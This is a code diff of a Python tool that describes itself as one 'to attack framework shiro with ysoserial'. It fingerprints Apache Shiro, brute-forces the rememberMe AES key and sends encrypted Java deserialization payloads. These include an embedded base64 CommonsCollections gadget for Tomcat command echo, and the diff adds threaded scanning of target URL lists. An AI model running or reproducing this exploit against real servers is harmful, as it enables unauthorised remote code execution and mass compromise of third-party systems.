@@ -14,6 +14,7 @@ import sys
 import uuid
 
 import requests
+import threadpool
 import urllib3
 from Crypto.Cipher import AES
 from faker import Factory
@@ -44,7 +45,7 @@ class Payload:
         self.key = key
 
     def gcm_encrypt(self, file_body=None):
-        file_body = self.file_body if file_body == None else file_body
+        file_body = self.file_body if file_body is None else file_body
         iv = os.urandom(16)
         cipher = AES.new(base64.b64decode(self.key), AES.MODE_GCM, iv)
         ciphertext, tag = cipher.encrypt_and_digest(file_body)
@@ -53,7 +54,7 @@ class Payload:
         return base64_ciphertext
 
     def cbc_encrypt(self, file_body=None):
-        file_body = self.file_body if file_body == None else file_body
+        file_body = self.file_body if file_body is None else file_body
         bs = AES.block_size
         def pad(s): return s + ((bs - len(s) % bs)
                                 * chr(bs - len(s) % bs)).encode()
@@ -67,9 +68,8 @@ class Payload:
 
 
 class Command:
-    def __init__(self, mode, url, type, key, data, proxies, command, gadget, ser):
+    def __init__(self, mode, type, key, data, proxies, command, gadget, ser):
         self.mode = mode
-        self.url = url
         self.type = type
         self.key = key
         self.data = data
@@ -82,30 +82,27 @@ class Command:
 class CheckShiro(Command):
     __random_str = RandomString(5, 10).__call__()
 
-    def __init__(self, mode, url, type, key, data, proxies, command, gadget, ser):
-        super().__init__(mode, url, type, key, data, proxies, command, gadget, ser)
-
-    def check_shiro(self):
+    def check_shiro(self, url):
         __header = {"User-Agent": Factory.create().user_agent(),
                     "Connection": "close"}
         try:
-            request = requests.get(url=self.url, timeout=10, proxies=self.proxies,
+            request = requests.get(url=url, timeout=10, proxies=self.proxies,
                                    verify=False, headers=__header, allow_redirects=False)
             if request.raise_for_status() != None:
-                print("[!] {} redirected or inaccessible!".format(self.url))
+                print("[!] {} redirected or inaccessible!".format(url))
                 print("[!] The status code : {}".format(
                     str(request.status_code)))
                 alive_url = None
                 exit()
             else:
-                alive_url = self.url
-        except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout) as e:
+                alive_url = url
+        except Exception as e:
             alive_url = None
-            print("[!] The target URL : {} can't connect!\n".format(self.url))
-            return None
+            print("[!] The target URL : {} can't connect!\n".format(url))
             # print("\r\n{}\r\n".format(e))
+            return None
 
-        if alive_url == None:
+        if alive_url is None:
             pass
         elif self.data:
             try:
@@ -116,52 +113,50 @@ class CheckShiro(Command):
                 print("[!] {} read time out!".format(alive_url))
                 return
             if "rememberMe" in str(request.headers):
-                print("[*] Shiro framework exists for {} !".format(self.url))
+                print("[*] Shiro framework exists for {} !".format(url))
                 return res_length
             else:
                 print(
-                    "[!] The Shiro framework may not exist for {},maybe you can remove '--data'/'-d' argument and try again \n".format(self.url))
+                    "[!] The Shiro framework may not exist for {},maybe you can remove '--data'/'-d' argument and try again \n".format(url))
         else:
             request = requests.get(url=alive_url, cookies={'rememberMe': self.__random_str}, timeout=10, proxies=self.proxies,
                                    verify=False, headers=__header, allow_redirects=False)
             res_length = len(str(request.headers))
 
             if "rememberMe" in str(request.headers):
-                print("[*] Shiro framework exists for {} !".format(self.url))
+                print("[*] Shiro framework exists for {} !".format(url))
                 return res_length
             else:
-                print("[!] The Shiro framework may not exist for {},maybe you can add '--data'/'-d' argument and try again \n".format(self.url))
+                print(
+                    "[!] The Shiro framework may not exist for {},maybe you can add '--data'/'-d' argument and try again \n".format(url))
 
 
 class VerifyKey(Command):
-    def __init__(self, mode, url, type, key, data, proxies, command, gadget, ser):
-        super().__init__(mode, url, type, key, data, proxies, command, gadget, ser)
-
-    def crack(self):
+    def crack(self, url):
         __header = {"User-Agent": Factory.create().user_agent(),
                     "Connection": "close"}
-        res_length = CheckShiro(self.mode, self.url, self.type, self.key, self.data,
-                                self.proxies, self.command, self.gadget, self.ser).check_shiro()
+        res_length = CheckShiro(self.mode, self.type, self.key, self.data,
+                                self.proxies, self.command, self.gadget, self.ser).check_shiro(url)
 
-        if res_length == None:
+        if res_length is None:
             return
 
-        if self.key == None:
+        if self.key is None:
+            print("[*] You didn't specify a shiro key. Start crack mode!")
             with open(os.path.join(sys.path[0], './lib/shiro_keys.txt'), 'r') as fr:
                 keys = fr.read().splitlines()
-            print("[*] You didn't specify a shiro key. Start crack mode!")
             for i in range(len(keys)):
                 if self.type == 'CBC':
                     payload = Payload(keys[i]).cbc_encrypt().decode()
                 elif self.type == 'GCM':
                     payload = Payload(keys[i]).gcm_encrypt().decode()
 
-                if self.data == None:
-                    r = requests.get(self.url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
+                if self.data is None:
+                    r = requests.get(url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
                                      verify=False, headers=__header, allow_redirects=False, data=data)
                     rsp = len(str(r.headers))
                 else:
-                    r = requests.post(self.url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
+                    r = requests.post(url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
                                       verify=False, headers=__header, allow_redirects=False, data=data)
                     rsp = len(str(r.headers))
 
@@ -170,8 +165,7 @@ class VerifyKey(Command):
                     print("[*] The payload : {0}\n".format(payload))
                     return keys[i]
             else:
-                print(
-                    "[!] The shiro key of {} cracking failed!".format(self.url))
+                print("[!] The shiro key of {} cracking failed!".format(url))
                 return False
 
         else:
@@ -180,12 +174,12 @@ class VerifyKey(Command):
                 payload = Payload(self.key).cbc_encrypt().decode()
             elif self.type == 'GCM':
                 payload = Payload(self.key).gcm_encrypt().decode()
-            if self.data == None:
-                r = requests.get(self.url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
+            if self.data is None:
+                r = requests.get(url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
                                  verify=False, headers=__header, allow_redirects=False, data=data)
                 rsp = len(str(r.headers))
             else:
-                r = requests.post(self.url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
+                r = requests.post(url, cookies={'rememberMe': payload}, timeout=10, proxies=self.proxies,
                                   verify=False, headers=__header, allow_redirects=False, data=data)
                 rsp = len(str(r.headers))
 
@@ -199,13 +193,13 @@ class VerifyKey(Command):
 
 
 class Exploit(Command):
-    def __init__(self, mode, url, type, key, data, proxies, command, gadget, ser):
-        super().__init__(mode, url, type, key, data, proxies, command, gadget, ser)
-        self.key = VerifyKey(self.mode, self.url, self.type, self.key, self.data,
-                             self.proxies, self.command, self.gadget, self.ser).crack()
+    def __init__(self, mode, type, key, data, proxies, command, gadget, ser):
+        super().__init__(mode, type, key, data, proxies, command, gadget, ser)
 
-    def tomcat_echo(self):
-        if self.key == None:
+    def tomcat_echo(self, url):
+        self.key = VerifyKey(self.mode, self.type, self.key, self.data,
+                             self.proxies, self.command, self.gadget, self.ser).crack(url)
+        if self.key is None:
             return
 
         tomcatEchoPayload = {"CommonsCollectionsK1": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMACEkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAH/////AXB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAPA8r+ur4AAAAyAOkBAAxGb29XRWN0SGptdmEHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAEUZvb1dFY3RIam12YS5qYXZhAQAJd3JpdGVCb2R5AQAXKExqYXZhL2xhbmcvT2JqZWN0O1tCKVYBACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsIAAkBAA9qYXZhL2xhbmcvQ2xhc3MHAAsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwADQAOCgAMAA8BAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAARABIKAAwAEwEACHNldEJ5dGVzCAAVAQACW0IHABcBABFqYXZhL2xhbmcvSW50ZWdlcgcAGQEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAGwAcCQAaAB0BABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAB8AIAoADAAhAQAGPGluaXQ+AQAEKEkpVgwAIwAkCgAaACUBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACcBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACkAKgoAKAArAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAAtAC4KAAQALwEAB2RvV3JpdGUIADEBAAlnZXRNZXRob2QMADMAIAoADAA0AQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcANgEAE2phdmEubmlvLkJ5dGVCdWZmZXIIADgBAAR3cmFwCAA6AQAEQ29kZQEACkV4Y2VwdGlvbnMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwA+AQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABDAEQKAAwARQEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcARwEADWdldFN1cGVyY2xhc3MMAEkALgoADABKAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAjAEwKAEgATQEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmplY3QHAE8BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAUQBSCgBQAFMBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAVQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABXAFgKAFYAWQEAEGphdmEvbGFuZy9TdHJpbmcHAFsBAAMoKVYMACMAXQoABABeAQAQamF2YS9sYW5nL1RocmVhZAcAYAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAYgBjCgBhAGQBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMAGYAZwoAYQBoAQAHdGhyZWFkcwgAagwAQQBCCgACAGwBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBuAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABwAHEKAGEAcgEABGV4ZWMIAHQBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAdgB3CgBcAHgBAARodHRwCAB6AQAGdGFyZ2V0CAB8AQASamF2YS9sYW5nL1J1bm5hYmxlBwB+AQAGdGhpcyQwCACAAQAHaGFuZGxlcggAggEABmdsb2JhbAgAhAEACnByb2Nlc3NvcnMIAIYBAA5qYXZhL3V0aWwvTGlzdAcAiAEABHNpemUBAAMoKUkMAIoAiwsAiQCMAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABXAI4LAIkAjwEAA3JlcQgAkQEAC2dldFJlc3BvbnNlCACTAQAJZ2V0SGVhZGVyCACVAQAIVGVzdGVjaG8IAJcBAAdpc0VtcHR5AQADKClaDACZAJoKAFwAmwEACXNldFN0YXR1cwgAnQEACWFkZEhlYWRlcggAnwEAB1Rlc3RjbWQIAKEBAAdvcy5uYW1lCACjAQAQamF2YS9sYW5nL1N5c3RlbQcApQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKcAqAoApgCpAQALdG9Mb3dlckNhc2UMAKsAcQoAXACsAQAGd2luZG93CACuAQAHY21kLmV4ZQgAsAEAAi9jCACyAQAHL2Jpbi9zaAgAtAEAAi1jCAC2AQARamF2YS91dGlsL1NjYW5uZXIHALgBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHALoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAjALwKALsAvQEABXN0YXJ0AQAVKClM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dGlsLkhhc2h0YWJsZRO7DyUhSuS4AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAh3CAAAAAsAAAAAeHB3AQB4c3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4AClsAC2lQYXJhbVR5cGVzcQB+AAl4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAB0AA5uZXdUcmFuc2Zvcm1lcnVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAABdHg=",
@@ -233,7 +227,7 @@ class Exploit(Command):
                     base64.b64decode(tomcatEchoPayload[gadget])).decode()
 
             cookie = {"rememberMe": payload}
-            rsp = requests.get(self.url, headers=headers,
+            rsp = requests.get(url, headers=headers,
                                cookies=cookie, verify=False, stream=True)
             if rsp.headers["Testecho"] == checker:
                 print("[*] Tomcat echo Exploit success")
@@ -255,8 +249,10 @@ class Exploit(Command):
         else:
             print("[!] Gadget Not Support")
 
-    def ysoserial_call(self):
-        if self.key == None:
+    def ysoserial_call(self, url):
+        self.key = VerifyKey(self.mode, self.type, self.key, self.data,
+                             self.proxies, self.command, self.gadget, self.ser).crack(url)
+        if self.key is None:
             return
 
         with subprocess.Popen(['java', '-jar', os.path.join(sys.path[0], "ysoserial.jar"), self.gadget, self.command], stdout=subprocess.PIPE) as op:
@@ -282,20 +278,22 @@ class Exploit(Command):
         cookies = {"rememberMe": payload}
 
         if self.data != None:
-            r = requests.post(url=self.url, headers=headers,
+            r = requests.post(url=url, headers=headers,
                               cookies=cookies, verify=False, data=self.data)
         else:
-            r = requests.get(url=self.url, headers=headers,
+            r = requests.get(url=url, headers=headers,
                              cookies=cookies, verify=False)
         try:
             print("[*] Send over : {}\n".format(r.status_code))
         except Exception as e:
-            print("[*] URL: {0}Error!\n{1}".format(self.url, e))
+            print("[*] URL: {0} Error!\n{1}".format(url, e))
             print("[*] Exploit Manual: ")
             print("Cookie: rememberMe={0}".format(payload.decode()))
 
-    def ser_encode(self):
-        if self.key == None:
+    def ser_encode(self, url):
+        self.key = VerifyKey(self.mode, self.type, self.key, self.data,
+                             self.proxies, self.command, self.gadget, self.ser).crack(url)
+        if self.key is None:
             return
 
         with open(os.path.join(sys.path[0], self.ser), 'rb') as fr:
@@ -306,88 +304,109 @@ class Exploit(Command):
         else:
             payload = Payload(self.key).gcm_encrypt(ser).decode()
 
-        print("[*] Payload generation complete!")
-        print("Cookie: rememberMe={}".format(payload))
+        headers = {"User-Agent": Factory.create().user_agent(),
+                   "Connection": "close", }
+        cookies = {"rememberMe": payload}
+
+        if self.data != None:
+            r = requests.post(url=url, headers=headers,
+                              cookies=cookies, verify=False, data=self.data)
+        else:
+            r = requests.get(url=url, headers=headers,
+                             cookies=cookies, verify=False)
+        try:
+            print("[*] Send over : {}\n".format(r.status_code))
+        except Exception as e:
+            print("[*] URL: {0} Error!\n{1}".format(url, e))
+            print("[*] Exploit Manual: ")
+            print("Cookie: rememberMe={0}".format(payload.decode()))
 
 
 class CommandFactory(Command):
-    def __init__(self, mode, url, type, key, data, proxies, command, gadget, ser):
-        super().__init__(mode, url, type, key, data, proxies, command, gadget, ser)
+    def __init__(self, mode, type, key, data, proxies, command, gadget, ser):
+        super().__init__(mode, type, key, data, proxies, command, gadget, ser)
 
-    def run(self):
+    def run(self, urls, _type):
         print('*' * 100)
-        if "http://" in self.url or "https://" in self.url:
-            _type = 'url'
-        else:
-            _type = 'file'
 
         if self.mode == 'check' and _type == 'url':
-            CheckShiro(self.mode, self.url, self.type, self.key, self.data,
-                       self.proxies, self.command, self.gadget, self.ser).check_shiro()
+            url = urls
+            CheckShiro(self.mode, self.type, self.key, self.data, self.proxies,
+                       self.command, self.gadget, self.ser).check_shiro(url)
 
         elif self.mode == 'check' and _type == 'file':
-            with open(os.path.join(sys.path[0], self.url), 'r') as fr:
-                urls = fr.read().splitlines()
-            for self.url in urls:
-                CheckShiro(self.mode, self.url, self.type, self.key, self.data,
-                           self.proxies, self.command, self.gadget, self.ser).check_shiro()
+            pool = threadpool.ThreadPool(thread)
+            reqs = threadpool.makeRequests(CheckShiro(
+                self.mode, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).check_shiro, urls)
+            [pool.putRequest(req) for req in reqs]
+            try:
+                pool.wait()
+            except Exception:
+                pass
 
         elif self.mode == "crack" and _type == 'url':
-            VerifyKey(self.mode, self.url, self.type, self.key, self.data,
-                      self.proxies, self.command, self.gadget, self.ser).crack()
+            url = urls
+            VerifyKey(self.mode, self.type, self.key, self.data,
+                      self.proxies, self.command, self.gadget, self.ser).crack(url)
 
         elif self.mode == "crack" and _type == 'file':
-            with open(os.path.join(sys.path[0], self.url), 'r') as fr:
-                urls = fr.read().splitlines()
-            for self.url in urls:
-                VerifyKey(self.mode, self.url, self.type, self.key, self.data,
-                          self.proxies, self.command, self.gadget, self.ser).crack()
+            pool = threadpool.ThreadPool(thread)
+            reqs = threadpool.makeRequests(VerifyKey(
+                self.mode, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).crack, urls)
+            [pool.putRequest(req) for req in reqs]
+            try:
+                pool.wait()
+            except:
+                pass
 
         elif self.mode == "echo" and _type == 'url':
-            Exploit(self.mode, self.url, self.type, self.key, self.data,
-                    self.proxies, self.command, self.gadget, self.ser).tomcat_echo()
+            url = urls
+            Exploit(self.mode, self.type, self.key, self.data, self.proxies,
+                    self.command, self.gadget, self.ser).tomcat_echo(url)
 
         elif self.mode == "echo" and _type == 'file':
-            with open(os.path.join(sys.path[0], self.url), 'r') as fr:
-                urls = fr.read().splitlines()
-            for self.url in urls:
-                Exploit(self.mode, self.url, self.type, self.key, self.data,
-                        self.proxies, self.command, self.gadget, self.ser).tomcat_echo()
+            pool = threadpool.ThreadPool(thread)
+            reqs = threadpool.makeRequests(Exploit(
+                self.mode, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).tomcat_echo, urls)
+            [pool.putRequest(req) for req in reqs]
+            pool.wait()
 
-        elif self.mode == "yso" and self.gadget == None:
+        elif self.mode == "yso" and self.gadget is None:
             print("[!] Specific Ysoserial Gadget!")
-            subprocess.Popen(
-                ['java', '-jar', os.path.join(sys.path[0], "ysoserial.jar")], stdout=subprocess.PIPE)
+            with subprocess.Popen(['java', '-jar', os.path.join(sys.path[0], "ysoserial.jar")], stdout=subprocess.PIPE) as op:
+                popen = op.stdout.read().decode()
+            print(popen)
+            exit()
 
         elif self.mode == "yso" and _type == 'url':
-            Exploit(self.mode, self.url, self.type, self.key, self.data,
-                    self.proxies, self.command, self.gadget, self.ser).ysoserial_call()
+            url = urls
+            Exploit(self.mode, self.type, self.key, self.data, self.proxies,
+                    self.command, self.gadget, self.ser).ysoserial_call(url)
 
         elif self.mode == "yso" and _type == 'file':
-            with open(os.path.join(sys.path[0], self.url), 'r') as fr:
-                urls = fr.read().splitlines()
-            for self.url in urls:
-                Exploit(self.mode, self.url, self.type, self.key, self.data,
-                        self.proxies, self.command, self.gadget, self.ser).ysoserial_call()
+            pool = threadpool.ThreadPool(thread)
+            reqs = threadpool.makeRequests(Exploit(self.mode, self.type, self.key, self.data,
+                                           self.proxies, self.command, self.gadget, self.ser).ysoserial_call, urls)
+            [pool.putRequest(req) for req in reqs]
+            pool.wait()
 
-        elif self.mode == "encode" and self.ser == None:
+        elif self.mode == "encode" and self.ser is None:
             print("[!] The encode mode must give serialize file!")
 
         elif self.mode == "encode" and self.ser != None and _type == 'url':
-            Exploit(self.mode, self.url, self.type, self.key, self.data,
-                    self.proxies, self.command, self.gadget, self.ser).ser_encode()
+            url = urls
+            Exploit(self.mode, self.type, self.key, self.data, self.proxies,
+                    self.command, self.gadget, self.ser).ser_encode(url)
 
         elif self.mode == "encode" and self.ser != None and _type == 'file':
-            with open(os.path.join(sys.path[0], self.url), 'r') as fr:
-                urls = fr.read().splitlines()
-            for self.url in urls:
-                Exploit(self.mode, self.url, self.type, self.key, self.data,
-                        self.proxies, self.command, self.gadget, self.ser).ser_encode()
+            pool = threadpool.ThreadPool(thread)
+            reqs = threadpool.makeRequests(Exploit(
+                self.mode, self.type, self.key, self.data, self.proxies, self.command, self.gadget, self.ser).ser_encode, urls)
+            [pool.putRequest(req) for req in reqs]
+            pool.wait()
 
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser(
-        description="This is a simple tool to attack framework shiro with ysoserial")
     parser = argparse.ArgumentParser(
         description="This is a simple tool to attack framework shiro with ysoserial")
     parser.add_argument('--mode', '-m', type=str,
@@ -408,6 +427,8 @@ if __name__ == '__main__':
                         metavar='', default={}, help='Specific Proxy')
     parser.add_argument('--ser', '-s', type=str, metavar='',
                         default=None, help='Specific serialize file name')
+    parser.add_argument('--thread', '-T', type=int, metavar='',
+                        default=1, help='Specific the number of threads')
     args = parser.parse_args()
 
     mode = str.lower(args.mode)
@@ -420,7 +441,13 @@ if __name__ == '__main__':
     ser = args.ser
     proxies = {args.proxies.split("://", 1)[0]: "{0}{1}{2}".format(args.proxies.split("://", 1)[
         0], "://", args.proxies.split("://", 1)[1])} if isinstance(args.proxies, str) else {}
+    thread = args.thread
 
-    cmd = CommandFactory(mode, url, type, key, data,
-                         proxies, command, gadget, ser)
-    cmd.run()
+    if "http://" in url or "https://" in url:
+        url_type = 'url'
+    else:
+        url_type = 'file'
+    with open(os.path.join(sys.path[0], "target_urls.txt"), 'r') as fr:
+        urls = list(set(fr.read().splitlines()))
+    cmd = CommandFactory(mode, type, key, data, proxies, command, gadget, ser)
+    cmd.run(urls, url_type)
